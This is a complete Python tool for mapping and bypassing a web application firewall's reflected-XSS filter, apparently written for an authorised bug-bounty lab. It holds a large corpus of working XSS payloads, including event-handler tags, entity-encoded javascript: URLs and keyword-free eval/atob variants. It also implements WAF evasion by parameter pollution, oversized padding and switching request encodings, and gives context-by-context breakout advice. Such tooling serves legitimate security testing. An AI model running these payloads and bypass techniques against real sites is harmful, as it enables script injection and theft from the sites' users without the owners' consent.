#!/usr/bin/env python3
"""
xss_waf_probe.py -- reflected-XSS filter mapper for authorised WAF testing.

Built for the Airlock bug-bounty playground (bugbounty.airlock.com), but the
methodology is generic: instead of firing payloads blind, it separates the two
independent things standing between you and script execution:

  1. the WAF, which REJECTS a request (block page / 4xx) before the app sees it
  2. the application, which ENCODES or STRIPS what it reflects

You cannot beat either one until you know which is which. This tool answers
that per-character and per-keyword, then tells you which transport tricks
change a verdict.

Stdlib only. Run it from a host that can actually reach the target.

  python3 xss_waf_probe.py -u 'https://host/xss-strict/xss-1.php?inject=jj'
  python3 xss_waf_probe.py -u '...' --phase chars,tokens
  python3 xss_waf_probe.py -u '...' --proxy 127.0.0.1:8080 --insecure   # via Burp
"""

from __future__ import annotations

import argparse
import http.client
import os
import re
import ssl
import sys
import time
from dataclasses import dataclass, field
from typing import Iterable
from urllib.parse import parse_qsl, quote, urlencode, urlsplit

# Left/right sentinels wrap every probe so we can recover the exact bytes the
# application emitted for our input. Pure alphanumeric so nothing can filter
# them and no encoder can alter them.
CANARY_L = "qzwx9l"
CANARY_R = "r9xwzq"
SPAN_RE = re.compile(
    re.escape(CANARY_L) + r"(.*?)" + re.escape(CANARY_R), re.DOTALL | re.IGNORECASE
)

BLOCK_STATUSES = {400, 403, 405, 406, 412, 413, 414, 418, 429, 501}

# Set once in main(); consulted by every formatting helper.
USE_COLOR = False


_UNSENDABLE = re.compile(r"[\x00-\x20\x7f]")


def minimal_encode(value: str) -> str:
    """Percent-encode only what cannot legally sit in a request line."""
    return _UNSENDABLE.sub(lambda m: "%%%02x" % ord(m.group()), value)


# --------------------------------------------------------------------------- #
# transport
# --------------------------------------------------------------------------- #


@dataclass
class Resp:
    status: int
    reason: str
    headers: dict
    body: str
    elapsed: float
    error: str = ""

    @property
    def length(self) -> int:
        return len(self.body)


@dataclass
class Target:
    url: str
    param: str
    proxy: str | None = None
    insecure: bool = False
    timeout: float = 15.0
    delay: float = 0.3
    extra_headers: dict = field(default_factory=dict)

    def __post_init__(self):
        parts = urlsplit(self.url)
        if parts.scheme not in ("http", "https"):
            raise SystemExit(f"unsupported scheme: {parts.scheme!r}")
        self.scheme = parts.scheme
        self.host = parts.hostname
        self.port = parts.port or (443 if parts.scheme == "https" else 80)
        self.path = parts.path or "/"
        # Every query param except the one we are fuzzing is preserved verbatim.
        self.other = [
            (k, v) for k, v in parse_qsl(parts.query, keep_blank_values=True)
            if k != self.param
        ]

    # -- connection ------------------------------------------------------- #

    def _connect(self):
        if self.scheme == "https":
            ctx = ssl.create_default_context()
            if self.insecure:
                # Only for intercepting proxies (Burp/ZAP) on your own box.
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
            if self.proxy:
                phost, _, pport = self.proxy.partition(":")
                conn = http.client.HTTPSConnection(
                    phost, int(pport or 8080), timeout=self.timeout, context=ctx
                )
                conn.set_tunnel(self.host, self.port)
            else:
                conn = http.client.HTTPSConnection(
                    self.host, self.port, timeout=self.timeout, context=ctx
                )
        else:
            if self.proxy:
                phost, _, pport = self.proxy.partition(":")
                conn = http.client.HTTPConnection(
                    phost, int(pport or 8080), timeout=self.timeout
                )
                conn.set_tunnel(self.host, self.port)
            else:
                conn = http.client.HTTPConnection(
                    self.host, self.port, timeout=self.timeout
                )
        return conn

    def raw(self, method: str, selector: str, body=None, headers=None) -> Resp:
        """Send a request with byte-level control over the request line."""
        hdrs = {
            "Host": self.host if self.port in (80, 443) else f"{self.host}:{self.port}",
            "User-Agent": "xss-waf-probe/1.0 (authorised testing)",
            "Accept": "*/*",
            # Keep bodies plain so reflection matching is reliable.
            "Accept-Encoding": "identity",
            "Connection": "close",
        }
        hdrs.update(self.extra_headers)
        if headers:
            hdrs.update(headers)

        t0 = time.time()
        try:
            conn = self._connect()
            conn.request(method, selector, body=body, headers=hdrs)
            r = conn.getresponse()
            data = r.read()
            resp = Resp(
                status=r.status,
                reason=r.reason,
                headers=dict(r.getheaders()),
                body=data.decode("utf-8", "replace"),
                elapsed=time.time() - t0,
            )
            conn.close()
        except Exception as exc:  # network-level failure is itself a signal
            resp = Resp(0, "ERROR", {}, "", time.time() - t0, error=f"{type(exc).__name__}: {exc}")
        if self.delay:
            time.sleep(self.delay)
        return resp

    # -- request shapes --------------------------------------------------- #

    def _query(self, encoded_value: str, extra_pairs: Iterable = ()) -> str:
        pairs = [f"{quote(k, safe='')}={quote(v, safe='')}" for k, v in self.other]
        pairs += [f"{quote(k, safe='')}={v}" for k, v in extra_pairs]
        pairs.append(f"{quote(self.param, safe='')}={encoded_value}")
        return self.path + "?" + "&".join(pairs)

    def get(self, value: str, raw: bool = False) -> Resp:
        """raw=True puts `value` on the wire with metacharacters unencoded.

        Only bytes the HTTP request line cannot carry are escaped, so a WAF
        sees literal <, ", ' and friends rather than %3c. Many rulesets
        normalise one form and not the other.
        """
        enc = minimal_encode(value) if raw else quote(value, safe="")
        return self.raw("GET", self._query(enc))

    def get_first(self, value: str, decoy: str = "benign") -> Resp:
        """HTTP parameter pollution: fuzzed param FIRST, decoy second."""
        sel = self.path + "?" + "&".join(
            [f"{quote(self.param, safe='')}={quote(value, safe='')}",
             f"{quote(self.param, safe='')}={decoy}"]
        )
        return self.raw("GET", sel)

    def get_last(self, value: str, decoy: str = "benign") -> Resp:
        """HPP the other way round: decoy first, payload last (PHP wins last)."""
        sel = self.path + "?" + "&".join(
            [f"{quote(self.param, safe='')}={decoy}",
             f"{quote(self.param, safe='')}={quote(value, safe='')}"]
        )
        return self.raw("GET", sel)

    def post_urlencoded(self, value: str) -> Resp:
        body = urlencode([(self.param, value)]).encode()
        return self.raw(
            "POST", self.path, body=body,
            headers={"Content-Type": "application/x-www-form-urlencoded",
                     "Content-Length": str(len(body))},
        )

    def post_multipart(self, value: str, pad: int = 0) -> Resp:
        b = "----xwp9BOUNDARY9pwx"
        parts = []
        if pad:
            parts.append(
                f"--{b}\r\nContent-Disposition: form-data; name=\"pad\"\r\n\r\n"
                + ("A" * pad) + "\r\n"
            )
        parts.append(
            f"--{b}\r\nContent-Disposition: form-data; name=\"{self.param}\"\r\n\r\n"
            f"{value}\r\n"
        )
        parts.append(f"--{b}--\r\n")
        body = "".join(parts).encode()
        return self.raw(
            "POST", self.path, body=body,
            headers={"Content-Type": f"multipart/form-data; boundary={b}",
                     "Content-Length": str(len(body))},
        )

    def get_padded(self, value: str, pad: int = 8192) -> Resp:
        """Push the payload past a WAF body/URL inspection ceiling."""
        return self.raw("GET", self._query(quote(value, safe=""),
                                           extra_pairs=[("pad", "A" * pad)]))


# --------------------------------------------------------------------------- #
# classification
# --------------------------------------------------------------------------- #

BLOCKED, RAW, ENCODED, DROPPED, ABSENT, ERROR = (
    "BLOCKED", "RAW", "ENCODED", "DROPPED", "ABSENT", "ERROR"
)

VERDICT_COLOR = {
    RAW: "\033[92m", BLOCKED: "\033[91m", ENCODED: "\033[93m",
    DROPPED: "\033[95m", ABSENT: "\033[90m", ERROR: "\033[90m",
}


@dataclass
class Verdict:
    kind: str
    detail: str
    resp: Resp

    def paint(self, use_color: bool | None = None) -> str:
        if use_color is None:
            use_color = USE_COLOR
        if not use_color:
            return self.kind
        return f"{VERDICT_COLOR.get(self.kind, '')}{self.kind}\033[0m"


def judge(resp: Resp, sent: str, block_re: re.Pattern | None) -> Verdict:
    """Decide whether the WAF blocked us, or the app merely encoded us."""
    if resp.error:
        return Verdict(ERROR, resp.error, resp)
    if block_re and block_re.search(resp.body):
        return Verdict(BLOCKED, f"block-regex, {resp.status}", resp)
    if resp.status in BLOCK_STATUSES:
        return Verdict(BLOCKED, f"HTTP {resp.status} {resp.reason}", resp)

    spans = SPAN_RE.findall(resp.body)
    if not spans:
        # Canaries themselves did not come back: request served, input not
        # reflected (wrong param, or the whole value was discarded).
        return Verdict(ABSENT, f"no canary span, HTTP {resp.status}", resp)

    got = spans[0]
    if got == sent:
        return Verdict(RAW, repr(got), resp)
    if got == "":
        return Verdict(DROPPED, "value stripped", resp)
    return Verdict(ENCODED, f"{sent!r} -> {got!r}", resp)


# --------------------------------------------------------------------------- #
# probe corpora
# --------------------------------------------------------------------------- #

# The characters that actually decide whether XSS is reachable.
CHARS = [
    ("<",  "tag open"),           (">",  "tag close"),
    ('"',  "double quote"),       ("'",  "single quote"),
    ("`",  "backtick"),           ("/",  "slash"),
    ("\\", "backslash"),          ("=",  "equals"),
    ("(",  "paren open"),         (")",  "paren close"),
    ("[",  "bracket open"),       ("]",  "bracket close"),
    ("{",  "brace open"),         ("}",  "brace close"),
    (";",  "semicolon"),          (":",  "colon"),
    ("&",  "ampersand"),          ("#",  "hash"),
    ("%",  "percent"),            ("+",  "plus"),
    ("-",  "dash"),               (".",  "dot"),
    (",",  "comma"),              ("|",  "pipe"),
    ("!",  "bang"),               ("$",  "dollar"),
    ("*",  "star"),               ("?",  "question"),
    ("@",  "at"),                 ("^",  "caret"),
    ("~",  "tilde"),              (" ",  "space"),
]

# Percent-encoded probes: whitespace / control bytes that Python refuses to put
# in a request line literally, plus normalisation tricks. Sent raw.
ENCODED_CHARS = [
    ("%09", "tab"),               ("%0a", "newline"),
    ("%0c", "form feed"),         ("%0d", "carriage return"),
    ("%00", "null byte"),         ("%20", "encoded space"),
    ("%2f", "encoded slash"),     ("%253c", "double-encoded <"),
    ("%25%33%63", "triple-ish <"), ("%c0%bc", "overlong UTF-8 <"),
    ("%uff1c", "%u fullwidth <"), ("%ef%bc%9c", "fullwidth < (UTF-8)"),
]

# Keywords deny-list WAFs reach for. If a bare word is blocked, the WAF is
# doing signature matching and you split/encode it; if it is merely encoded,
# the app is the obstacle and you need a different reflection context.
TOKENS = [
    "script", "javascript", "alert", "prompt", "confirm", "eval",
    "onerror", "onload", "onfocus", "ontoggle", "onanimationstart",
    "onbeforetoggle", "onpointerrawupdate", "onscrollend",
    "img", "svg", "iframe", "object", "embed", "details", "video",
    "audio", "marquee", "form", "button", "input", "select", "textarea",
    "style", "body", "math", "template", "base", "meta", "link",
    "src", "href", "data", "srcdoc", "formaction", "autofocus",
    "document", "window", "location", "cookie", "fetch", "import",
    "constructor", "atob", "String.fromCharCode", "expression",
    "data:", "javascript:", "vbscript:", "&#", "\\u0061",
]

# Candidate breakouts. Ordered roughly by how often they survive a strict
# ruleset. `%%PAY%%` marks the JS you would swap for your own proof.
PAYLOADS = [
    # --- plain HTML body context ---
    "<svg onload=alert(1)>",
    "<img src=x onerror=alert(1)>",
    "<details open ontoggle=alert(1)>",
    "<video><source onerror=alert(1)>",
    "<marquee onstart=alert(1)>",
    "<body onpageshow=alert(1)>",
    "<input autofocus onfocus=alert(1)>",
    "<select autofocus onfocus=alert(1)>",
    "<textarea autofocus onfocus=alert(1)>",
    "<style onload=alert(1)>",
    "<object data=javascript:alert(1)>",
    "<iframe srcdoc=\"&lt;script&gt;alert(1)&lt;/script&gt;\">",
    "<form><button formaction=javascript:alert(1)>x",
    "<math><mtext><script>alert(1)</script>",
    # --- separator fuzzing between tag and attribute ---
    "<svg/onload=alert(1)>",
    "<svg\tonload=alert(1)>",
    "<svg\nonload=alert(1)>",
    "<svg\ronload=alert(1)>",
    "<svg\x0conload=alert(1)>",
    "<svg//onload=alert(1)>",
    "<svg/x=y onload=alert(1)>",
    "<img/src/onerror=alert(1)>",
    # --- rarely-signatured handlers ---
    "<div onbeforetoggle=alert(1) popover id=p><button popovertarget=p>x",
    "<div style=animation-name:x onanimationstart=alert(1)>",
    "<div onpointerrawupdate=alert(1) style=height:99px;width:99px>x",
    "<xmp><img src=x onerror=alert(1)>",
    # --- entity / escape smuggling inside an attribute ---
    "<a href=\"javascript&colon;alert(1)\">x</a>",
    "<a href=\"java&Tab;script:alert(1)\">x</a>",
    "<a href=\"&#106;avascript:alert(1)\">x</a>",
    "<a href=\"&#x6a;avascript&#58;alert&#40;1&#41;\">x</a>",
    # --- attribute-context breakouts (if reflection is inside a tag) ---
    "\" onmouseover=alert(1) x=\"",
    "' onmouseover=alert(1) x='",
    "\"><svg onload=alert(1)>",
    "'><svg onload=alert(1)>",
    "` onmouseover=alert(1) x=`",
    # --- script-context breakouts (if reflection is inside <script>) ---
    "'-alert(1)-'",
    "\"-alert(1)-\"",
    "</script><svg onload=alert(1)>",
    "\\'-alert(1)//",
    "${alert(1)}",
    # --- call/keyword-free variants, for when alert() or () is filtered ---
    "<svg onload=alert`1`>",
    "<svg onload=top['ale'+'rt'](1)>",
    "<svg onload=window[atob('YWxlcnQ=')](1)>",
    "<svg onload=\\u0061lert(1)>",
    "<svg onload=Function`alert\\x281\\x29```>",
    "<svg onload=eval(atob('YWxlcnQoMSk='))>",
]

# Transport-level manipulations. If a payload is BLOCKED as a plain GET but
# lands otherwise, the WAF's parser and the app's parser disagree -- which is
# the bypass.
TRANSPORTS = [
    ("GET plain",            lambda t, p: t.get(p)),
    ("GET raw (unencoded)",  lambda t, p: t.get(p, raw=True)),
    ("GET HPP first",        lambda t, p: t.get_first(p)),
    ("GET HPP last",         lambda t, p: t.get_last(p)),
    ("GET + 8KB padding",    lambda t, p: t.get_padded(p, 8192)),
    ("GET + 64KB padding",   lambda t, p: t.get_padded(p, 65536)),
    ("POST urlencoded",      lambda t, p: t.post_urlencoded(p)),
    ("POST multipart",       lambda t, p: t.post_multipart(p)),
    ("POST multipart +64KB", lambda t, p: t.post_multipart(p, pad=65536)),
]


# --------------------------------------------------------------------------- #
# phases
# --------------------------------------------------------------------------- #


def wrap(value: str) -> str:
    return CANARY_L + value + CANARY_R


def show_context(target: Target, color: bool) -> None:
    """Find where our input lands and print the surrounding markup."""
    print(head("PHASE 1  reflection context"))
    resp = target.get(wrap("PROBE"))
    print(f"  baseline: HTTP {resp.status} {resp.reason}  {resp.length} bytes  "
          f"{resp.elapsed*1000:.0f}ms")
    if resp.error:
        print("  " + tint("network error:", "\033[91m") + f" {resp.error}")
        return
    hits = [m for m in SPAN_RE.finditer(resp.body)]
    if not hits:
        print("  " + tint("no reflection found", "\033[91m")
              + " -- wrong --param, or the value is consumed server-side.")
        low = resp.body.lower()
        for marker in ("blocked", "denied", "reference", "firewall", "airlock"):
            if marker in low:
                idx = low.index(marker)
                print(f"  looks like a block page ({marker!r}): "
                      f"...{resp.body[max(0,idx-80):idx+120]}...")
                break
        return
    print(f"  {len(hits)} reflection point(s):\n")
    for n, m in enumerate(hits, 1):
        s, e = m.start(), m.end()
        before = resp.body[max(0, s - 130):s]
        after = resp.body[e:e + 130]
        hl = tint("PROBE", "\033[96m")
        print(f"  [{n}] ...{before}{hl}{after}...")
        print(f"      {guess_context(before, after)}\n")


def guess_context(before: str, after: str) -> str:
    """Cheap heuristic: which escape do you actually need here?"""
    b = before.lower()
    open_script = b.rfind("<script")
    close_script = b.rfind("</script")
    if open_script > close_script:
        return ("-> JS context. You need to break the string/statement "
                "('-alert(1)-'  or  </script><svg onload=...>), not inject a tag.")
    lt, gt = b.rfind("<"), b.rfind(">")
    if lt > gt:
        q = None
        tail = before[lt:]
        if tail.count('"') % 2 == 1:
            q = '"'
        elif tail.count("'") % 2 == 1:
            q = "'"
        if q:
            return (f"-> inside a {q}-quoted attribute. Need {q} to escape, then a "
                    f"new event handler, or {q}> for a fresh tag.")
        return ("-> inside a tag, unquoted attribute. A space plus an event "
                "handler may be enough -- no < needed.")
    if "href" in b[-120:] or "src" in b[-120:]:
        return "-> URL context. Try javascript: scheme smuggling and entity encoding."
    if "<!--" in b and "-->" not in b[b.rfind("<!--"):]:
        return "-> inside an HTML comment. Close it with --> first."
    return "-> HTML body/text context. A tag injection is the goal; you need < and >."


def run_chars(target: Target, block_re, color: bool) -> dict:
    print(head("PHASE 2  character map  (what survives, and who mangles it)"))
    results = {}
    for ch, name in CHARS:
        sent = wrap(ch)
        v = judge(target.get(sent), ch, block_re)
        results[ch] = v
        print(f"  {name:<16} {ch!r:<6} {v.paint(color):<10} {v.detail}")
    print("\n  percent-encoded / normalisation probes (sent raw):")
    for enc, name in ENCODED_CHARS:
        sel_value = quote(CANARY_L, safe="") + enc + quote(CANARY_R, safe="")
        v = judge(target.get(sel_value, raw=True), None, block_re)
        # Post-decode bytes are unknown up front, so RAW-vs-ENCODED is not
        # meaningful here. What matters is BLOCKED vs not, plus what came back:
        # a probe that decodes to "<" server-side but is not blocked is a
        # normalisation gap, and that is the bypass.
        if v.kind in (BLOCKED, ABSENT, ERROR):
            kind, detail = v.kind, v.detail
        else:
            kind = "PASSED"
            got = SPAN_RE.findall(v.resp.body)
            detail = f"decoded to {got[0]!r}" if got else ""
        print(f"  {name:<16} {enc:<14} "
              f"{tint(f'{kind:<10}', VERDICT_COLOR.get(v.kind, ''))} {detail}")
    return results


def run_tokens(target: Target, block_re, color: bool) -> dict:
    print(head("PHASE 3  keyword map  (is the WAF signature-matching words?)"))
    results = {}
    for tok in TOKENS:
        v = judge(target.get(wrap(tok)), tok, block_re)
        results[tok] = v
        print(f"  {tok:<22} {v.paint(color):<10} {v.detail}")
    return results


def run_payloads(target: Target, block_re, color: bool) -> list:
    print(head("PHASE 4  payload sweep"))
    survivors = []
    for p in PAYLOADS:
        v = judge(target.get(wrap(p)), p, block_re)
        if v.kind == RAW:
            survivors.append(p)
        disp = p.replace("\n", "\\n").replace("\r", "\\r").replace("\t", "\\t")
        disp = disp.replace("\x0c", "\\f")
        print(f"  {v.paint(color):<10} {disp[:78]}")
    print()
    if survivors:
        print("  " + tint("UNFILTERED -- these reached the page byte-for-byte:",
                                "\033[92m"))
        for s in survivors:
            print(f"    {s}")
        print("\n  Open one in a browser and confirm it EXECUTES. Reflected != executed:\n"
              "  CSP, the wrong context, or a quirks-mode parser can still stop it.")
    else:
        print("  Nothing landed raw. Take the least-mangled result from phase 2/3\n"
              "  and build up from that character set -- see README 'Composing'.")
    return survivors


def run_transports(target: Target, payload: str, block_re, color: bool) -> None:
    print(head(f"PHASE 5  transport differentials for: {payload}"))
    print("  A verdict that changes between rows is a parser disagreement --\n"
          "  the WAF and the app are reading different requests.\n")
    for name, fn in TRANSPORTS:
        try:
            v = judge(fn(target, wrap(payload)), payload, block_re)
        except Exception as exc:
            print(f"  {name:<24} ERROR      {type(exc).__name__}: {exc}")
            continue
        print(f"  {name:<24} {v.paint(color):<10} "
              f"HTTP {v.resp.status} {v.resp.length}b  {v.detail[:60]}")


def tint(text: str, code: str) -> str:
    return f"{code}{text}\033[0m" if USE_COLOR else text


def head(text: str) -> str:
    rule = "=" * 72
    if not USE_COLOR:
        return f"\n{rule}\n{text}\n{rule}"
    return f"\n\033[1m{rule}\n{text}\n{rule}\033[0m"


# --------------------------------------------------------------------------- #


def main() -> int:
    ap = argparse.ArgumentParser(
        description="Map a WAF's reflected-XSS filter (authorised testing only).",
        epilog="Only run this against a target you are permitted to test.",
    )
    ap.add_argument("-u", "--url", required=True,
                    help="full target URL including the parameter to fuzz")
    ap.add_argument("-p", "--param",
                    help="parameter name to fuzz (default: first query param)")
    ap.add_argument("--phase", default="context,chars,tokens,payloads",
                    help="comma list: context,chars,tokens,payloads,transport,all")
    ap.add_argument("--transport-payload", default="<svg onload=alert(1)>",
                    help="payload to run the phase-5 transport differentials with")
    ap.add_argument("--block-regex",
                    help="regex identifying the WAF block page (pin this once you "
                         "have seen one -- it makes every verdict exact)")
    ap.add_argument("--proxy", help="upstream proxy host:port, e.g. 127.0.0.1:8080")
    ap.add_argument("--insecure", action="store_true",
                    help="skip TLS verification (only for an intercepting proxy)")
    ap.add_argument("--delay", type=float, default=0.3,
                    help="seconds between requests (default 0.3; be kind to the lab)")
    ap.add_argument("--timeout", type=float, default=15.0)
    ap.add_argument("-H", "--header", action="append", default=[],
                    metavar="K:V", help="extra request header, repeatable")
    ap.add_argument("--no-color", action="store_true")
    args = ap.parse_args()

    global USE_COLOR
    color = (not args.no_color and sys.stdout.isatty()
             and os.environ.get("TERM") != "dumb")
    USE_COLOR = color

    param = args.param
    if not param:
        q = parse_qsl(urlsplit(args.url).query, keep_blank_values=True)
        if not q:
            return fail("no query parameter in URL; pass --param")
        param = q[0][0]

    extra = {}
    for h in args.header:
        k, _, v = h.partition(":")
        if not v:
            return fail(f"bad header {h!r}, expected K:V")
        extra[k.strip()] = v.strip()

    block_re = re.compile(args.block_regex, re.I) if args.block_regex else None

    target = Target(args.url, param, proxy=args.proxy, insecure=args.insecure,
                    timeout=args.timeout, delay=args.delay, extra_headers=extra)

    phases = {p.strip() for p in args.phase.split(",") if p.strip()}
    if "all" in phases:
        phases = {"context", "chars", "tokens", "payloads", "transport"}

    print(f"target   {args.url}")
    print(f"param    {param}")
    print(f"phases   {', '.join(sorted(phases))}")
    if args.proxy:
        print(f"proxy    {args.proxy}")

    if "context" in phases:
        show_context(target, color)
    if "chars" in phases:
        run_chars(target, block_re, color)
    if "tokens" in phases:
        run_tokens(target, block_re, color)
    if "payloads" in phases:
        run_payloads(target, block_re, color)
    if "transport" in phases:
        run_transports(target, args.transport_payload, block_re, color)

    print("\ndone.")
    return 0


def fail(msg: str) -> int:
    print(f"error: {msg}", file=sys.stderr)
    return 2


if __name__ == "__main__":
    sys.exit(main())
